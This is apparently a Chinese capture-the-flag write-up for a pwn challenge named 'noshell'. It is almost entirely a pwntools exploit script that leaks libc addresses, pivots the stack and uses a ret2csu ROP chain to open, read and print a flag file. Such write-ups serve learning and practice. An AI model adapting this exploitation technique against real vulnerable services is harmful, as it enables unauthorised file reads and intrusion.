## 考点

orw+栈迁移+ret2csu
## 工具
python3

## 步骤

```python
from pwn import *
context.log_level='debug'
context.arch='amd64'
context.os='linux'

def ret2csu(func,rdi,rsi,rdx):
    payload=p64(0)+p64(0)+p64(1)+p64(rdi)+p64(rsi)+p64(rdx)+p64(func)
    payload+=p64(0x401350)
    return payload

p=process('./noshell')
#gdb.attach(p)
libc=ELF('./libc-2.31.so')
elf=ELF('./noshell')
leave_ret_addr=0x40130b
rdi_addr=0x401373
num_addr=0x404080
csu_addr=0x401366
puts_got=0x404018
puts_plt=elf.plt['puts']
read_got=0x404020
main_addr=0x401270
payload=b'./flag\x00\x00'
p.sendafter(b'Let me give you a gift~\n',payload)
p.sendafter(b'Can you get shell now?\n',p64(0)+p64(num_addr+24)+p64(rdi_addr)+p64(read_got)+p64(puts_plt)+p64(main_addr))
libcbase=u64(p.recvuntil(b'\x7f').ljust(8,b'\x00'))-libc.symbols['read']
print(hex(libcbase))
read_addr=libcbase+libc.symbols['read']
write_addr=libcbase+libc.symbols['write']
open_addr=libcbase+libc.symbols['open']
payload+=p64(csu_addr)
payload+=ret2csu(num_addr+0x100,num_addr,0,0)
payload+=ret2csu(num_addr+0x108,3,num_addr+0x120,0x30)
payload+=ret2csu(num_addr+0x110,1,num_addr+0x120,0x30)
payload=payload.ljust(0x100,b'\x00')
payload+=p64(open_addr)+p64(read_addr)+p64(write_addr)
p.sendafter(b'Let me give you a gift~\n',payload)
p.sendafter(b'Can you get shell now?\n',p64(0)+p64(num_addr)+p64(leave_ret_addr))
p.interactive()
#pause()
```
